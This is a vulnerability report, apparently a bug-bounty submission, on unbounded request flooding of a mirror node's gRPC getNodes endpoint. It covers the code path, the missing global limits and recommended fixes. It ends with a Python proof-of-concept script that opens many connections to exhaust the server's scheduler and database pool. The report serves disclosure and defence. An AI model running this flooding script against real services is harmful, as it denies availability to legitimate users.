### Title
Unbounded Multi-Connection Request Flooding via Non-Blocking `subscribe()` in `getNodes()` Exhausts Reactive Scheduler and DB Pool

### Summary
The `getNodes()` handler in `NetworkController` uses a non-blocking `subscribe()` that immediately frees the gRPC I/O thread and offloads work to `Schedulers.boundedElastic()`, allowing the server to accept new requests far faster than it can complete them. The only concurrency guard is `maxConcurrentCallsPerConnection = 5`, which is scoped per-connection; an unprivileged attacker opening many parallel TCP connections bypasses this entirely, flooding the reactive scheduler and database connection pool with sustained, resource-intensive address-book pipelines.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java`, `getNodes()`, lines 33–43:
```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(networkService::getNodes)
        .map(this::toNodeAddress)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```
`subscribe()` is fire-and-forget: it schedules the reactive pipeline and returns a `Disposable` immediately. The gRPC handler method returns, freeing the Netty I/O thread to accept the next request.

**Root cause — `NetworkServiceImpl.getNodes()` (lines 55–77):**
Each subscription executes:
1. `addressBookRepository.findLatestTimestamp()` — synchronous DB query
2. `nodeStakeRepository.findLatestTimestamp()` — synchronous DB query
3. `nodeStakeRepository.findAllStakeByConsensusTimestamp()` — potentially large DB query
4. A `repeatWhen` loop paging through address book entries with a **250 ms `pageDelay`** on `Schedulers.boundedElastic()`, holding a thread for the full duration of the stream

When `limit = 0` (the proto default), `take(Long.MAX_VALUE)` is used — the pipeline runs until all nodes are returned, keeping the stream and a `boundedElastic` thread alive for the entire multi-page traversal.

**Why the existing check is insufficient:**

`GrpcConfiguration.java` line 33:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
`NettyProperties.java` line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```
This is the **only** server-side guard. It limits concurrent HTTP/2 streams to 5 **per TCP connection**. There is no:
- Global concurrent-call limit
- Global connection limit (`maxConnectionAge`, `maxConnectionIdle`, or connection count cap are absent from `GrpcConfiguration`)
- Per-IP rate limit
- Any throttle mechanism in the `grpc` module (the `ThrottleManager`/`Bucket4j` infrastructure exists only in the `web3` module)

The single gRPC interceptor (`GrpcInterceptor.java`) only sets an `EndpointContext` for table-usage tracking — no rate limiting.

**Exploit flow:**
An attacker opens *N* TCP connections to port 5600 and immediately sends 5 concurrent `getNodes(AddressBookQuery{limit:0})` RPCs on each. Because `subscribe()` is non-blocking, the gRPC framework accepts all 5 streams per connection and immediately becomes ready for the next connection's streams. The result is *N × 5* simultaneous reactive pipelines, each:
- Holding a `boundedElastic` thread during 250 ms page delays
- Issuing repeated DB queries against the address book and node-stake tables
- Keeping the gRPC stream open (and thus the HTTP/2 stream slot occupied) for the full traversal

### Impact Explanation
- **Reactive scheduler exhaustion**: `Schedulers.boundedElastic()` defaults to `10 × CPU cores` threads with a 100,000-task queue. Enough connections fill the queue, causing new legitimate subscriptions to be rejected or delayed indefinitely.
- **Database connection pool starvation**: Each page call executes inside `transactionOperations.execute()`, consuming a DB connection for the duration of the page. Concurrent pipelines drain the pool, causing legitimate queries across all mirror-node services sharing the DB to time out.
- **Memory pressure**: Each `AddressBookContext` and its `nodeStakeMap` (one per active subscription) accumulates in heap; with many concurrent streams this causes GC pressure or OOM.
- **Severity**: Medium — pure griefing/availability impact, no economic damage, but the gRPC address-book endpoint becomes unavailable to legitimate callers (e.g., Hedera SDK clients bootstrapping node lists).

### Likelihood Explanation
- **No authentication required**: the gRPC `NetworkService` is publicly accessible; any client can call `getNodes`.
- **Trivially scriptable**: a single machine with a standard gRPC client library (e.g., `grpcurl`, Hedera SDK) can open hundreds of connections in a loop.
- **Repeatable**: after streams complete the attacker simply reconnects; there is no backoff, ban, or token-bucket enforcement.
- **Low cost**: the attacker sends tiny protobuf requests (~10 bytes each); all resource cost is server-side.

### Recommendation
1. **Add a global concurrent-call limit** via `NettyServerBuilder.maxConcurrentCallsPerConnection` combined with a global connection cap (`maxConnectionAge`, `maxConnectionIdle`, or a custom `ServerInterceptor` tracking active streams across all connections).
2. **Introduce per-IP or global rate limiting** in the gRPC module analogous to the `Bucket4j`-based `ThrottleManager` already present in the `web3` module — reject `getNodes` calls exceeding a configurable RPS threshold.
3. **Enforce a hard `limit` floor**: reject or cap requests where `AddressBookQuery.limit == 0` to a server-defined maximum (e.g., 500) so each stream has a bounded lifetime, reducing per-stream resource hold time.
4. **Apply `maxConnectionAge` / `maxConnectionIdle`** in `GrpcConfiguration` to force connection recycling and prevent indefinite stream accumulation from a single source IP.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import network_service_pb2, network_service_pb2_grpc
from proto.services import basic_types_pb2

TARGET = "mirror.node.host:5600"
CONNECTIONS = 50   # open 50 TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    # limit=0 → server uses Long.MAX_VALUE, stream stays open for full traversal
    query = network_service_pb2.AddressBookQuery(limit=0)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.getNodes(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for w in workers: w.start()
for w in workers: w.join()
# Result: 250 concurrent reactive pipelines on boundedElastic + DB pool;
# legitimate getNodes calls begin timing out or receiving RESOURCE_EXHAUSTED.
```